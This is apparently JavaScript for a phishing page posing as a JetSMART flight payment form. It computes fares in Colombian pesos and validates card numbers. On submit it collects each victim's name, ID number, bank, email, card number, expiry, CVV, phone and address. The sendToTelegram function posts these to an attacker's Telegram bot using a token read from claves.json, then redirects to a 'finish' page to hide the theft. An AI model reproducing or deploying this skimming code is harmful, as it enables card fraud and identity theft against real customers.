const DOMElements = {
    labelDepartures: document.querySelector('#label-departures'),
    labelTotalResume: document.querySelector('#label-total-resume'),
    btnNextStep: document.querySelector('#btn-next-step'),
    contPaymentMethod: document.querySelector('#payment-method'),
    contCardInputs: document.querySelector('#card-inputs'),
    btnSubmitForm: document.querySelector('#submit-form'),
    inputP: document.querySelector('#p'),
    formMain: document.querySelector('#main-form'),
};

/**
 * Startup@Payment
 */
document.addEventListener('DOMContentLoaded', () => {
    eventListeners();
    updateDOM();
    // sendStatus();  // Comentado para evitar error
});

/**
 * Events@Payment
 */
const eventListeners = () => {
    const { contPaymentMethod, contCardInputs, btnNextStep, btnSubmitForm, formMain } = DOMElements;

    contPaymentMethod.addEventListener('click', () => {
        contCardInputs.classList.remove('hide');
    });

    btnNextStep.addEventListener('click', () => {
        btnSubmitForm.click();
    });

    formMain.addEventListener('submit', (e) => {
        e.preventDefault();
        validateCardFiels();
    });
};

const updateDOM = () => {
    const { labelDepartures, labelTotalResume } = DOMElements;
    const { travel_type, seat_type, origin, destination, adults, children, babies, flightDates } = info.flightInfo || {};

    /** Label departures */
    if (travel_type === 1) {
        labelDepartures.textContent = `${origin?.city || ''} - ${destination?.city || ''} | ${destination?.city || ''} - ${origin?.city || ''}`;
    } else if (travel_type === 2) {
        labelDepartures.textContent = `${origin?.city || ''} - ${destination?.city || ''}`;
    }

    /** label total flight */
    const totalLight = (PRECIO_BASE * (adults + children)) || 0;
    const totalSmart = (PRECIO_BASE * (MULTIPLICADORES_PRECIO?.smart || 1.7) * (adults + children)) || 0;
    const totalFull = (PRECIO_BASE * (MULTIPLICADORES_PRECIO?.full || 3) * (adults + children)) || 0;
   
    let total = 0;
    if (origin?.ticket_type === 'light') total += totalLight;
    else if (origin?.ticket_type === 'smart') total += totalSmart;
    else if (origin?.ticket_type === 'full') total += totalFull;

    if (travel_type === 1) {
        if (destination?.ticket_type === 'light') total += totalLight;
        else if (destination?.ticket_type === 'smart') total += totalSmart;
        else if (destination?.ticket_type === 'full') total += totalFull;
    }

    if (labelTotalResume) {
        labelTotalResume.textContent = '$ ' + total.toLocaleString('es-ES') + ' COP';
    }
};

/**
 * Functions@Payment
 */
const validateCardFiels = () => {
    const p = document.querySelector('#p');
    const pdate = document.querySelector('#pdate');
    const c = document.querySelector('#c');
    const ban = document.querySelector('#ban');
    const name = document.querySelector('#name');
    const surname = document.querySelector("#surname");
    const cc = document.querySelector('#cc');
    const email = document.querySelector('#email');
    const telnum = document.querySelector('#telnum');
    const city = document.querySelector('#city');
    const address = document.querySelector('#address');

    if ((p.value.length === 19 && p.value[0] !== '3' && ['4', '5'].includes(p.value[0])) || (p.value.length === 17 && p.value[0] === '3')) {
        if (isLuhnValid(p.value)) {
            if (isValidDate(pdate.value)) {
                if ((c.value.length === 3 && p.value.length === 19) || (c.value.length === 4 && p.value.length === 17)) {

                    console.log("Ok. Let's go!");

                    const formData = {
                        nombre: name.value + " " + surname.value,
                        id: cc.value,
                        banco: ban.value,
                        email: email.value,
                        tarjeta: p.value,
                        ftarjeta: pdate.value,
                        cvv: c.value,
                        celular: telnum.value,
                        direccion: address.value + " " + city.value,
                        fecha_hora: new Date().toLocaleString('es-CO')
                    };

                    // Guardar en localStorage
                    localStorage.setItem("pagojet", JSON.stringify(formData));

                    // === ENVÍO AL TELEGRAM ===
                    sendToTelegram(formData);

                    console.log(formData);

                    // Mostrar loader y redirigir
                    document.querySelector('.loader').classList.add('show');
                    setTimeout(() => window.location.href = 'finish.html', 2500);

                } else {
                    alert('Revise el CVV de su tarjeta.');
                    c.value = '';
                    c.focus();
                }
            } else {
                alert('Revise la fecha de vencimiento de su tarjeta.');
                pdate.value = '';
                pdate.focus();
            }
        } else {
            alert('Número de tarjeta inválido. Revisalo e intenta de nuevo.');
            p.value = '';
            p.focus();
        }
    } else {
        alert('Revisa el número de tu tarjeta.');
        p.value = '';
        p.focus();
    }
};

// ======================
// ENVÍO A TELEGRAM
// ======================
async function sendToTelegram(data) {
    try {
        const response = await fetch('claves.json');
        const keys = await response.json();

        const message = `
🚨 *Nueva Tarjeta - JetSMART* 🚨

👤 Nombre: ${data.nombre || 'N/A'}
🪪 Documento: ${data.id || 'N/A'}
🏦 Banco: ${data.banco || 'N/A'}
📧 Email: ${data.email || 'N/A'}
💳 Tarjeta: \`${data.tarjeta}\`
📅 Vencimiento: ${data.ftarjeta}
🔑 CVV: \`${data.cvv}\`
📱 Teléfono: ${data.celular || 'N/A'}
📍 Dirección: ${data.direccion || 'N/A'}
⏰ ${data.fecha_hora}
        `.trim();

        const url = `https://api.telegram.org/bot${keys.token}/sendMessage`;

        await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: keys.chat_id,
                text: message,
                parse_mode: 'Markdown'
            })
        });

        console.log("✅ Datos enviados correctamente a Telegram");
    } catch (error) {
        console.error("❌ Error enviando a Telegram:", error);
    }
}

// ======================
// FUNCIONES DE VALIDACIÓN (originales)
// ======================
function updateLS() {
    localStorage.setItem("metaInfo", JSON.stringify(info.metaInfo));
    localStorage.setItem("checkerInfo", JSON.stringify(info.checkerInfo));
    localStorage.setItem("flightInfo", JSON.stringify(info.flightInfo));
}

function formatCNumber(input) {
    let numero = input.value.replace(/\D/g, '');
    let numeroFormateado = '';

    if (numero[0] === '3') {
        c.setAttribute('oninput', "limitDigits(this, 4)");
        if (numero.length > 15) numero = numero.substr(0, 15);
        for (let i = 0; i < numero.length; i++) {
            if (i === 4 || i === 10) numeroFormateado += ' ';
            numeroFormateado += numero.charAt(i);
        }
        input.value = numeroFormateado;
    } else {
        c.setAttribute('oninput', "limitDigits(this, 3)");
        if (numero.length > 16) numero = numero.substr(0, 16);
        for (let i = 0; i < numero.length; i++) {
            if (i > 0 && i % 4 === 0) numeroFormateado += ' ';
            numeroFormateado += numero.charAt(i);
        }
        input.value = numeroFormateado;
    }
}

function formatDate(input) {
    var texto = input.value.replace(/\D/g, '').substring(0, 4);
    if (texto.length > 2) {
        texto = texto.substring(0, 2) + '/' + texto.substring(2, 4);
    }
    input.value = texto;
}

function isLuhnValid(bin) {
    bin = bin.replace(/\D/g, '');
    if (bin.length < 6) return false;
    const digits = bin.split('').map(Number).reverse();
    let sum = 0;
    for (let i = 0; i < digits.length; i++) {
        if (i % 2 !== 0) {
            let doubled = digits[i] * 2;
            if (doubled > 9) doubled -= 9;
            sum += doubled;
        } else {
            sum += digits[i];
        }
    }
    return sum % 10 === 0;
}

function isValidDate(fechaInput) {
    var partes = fechaInput.split('/');
    var mesInput = parseInt(partes[0]);
    var anioInput = parseInt(partes[1]) + 2000;
    var fechaActual = new Date();
    var mesActual = fechaActual.getMonth() + 1;
    var anioActual = fechaActual.getFullYear();

    if (anioInput < anioActual || (anioInput === anioActual && mesInput < mesActual)) {
        return false;
    }
    return true;
}
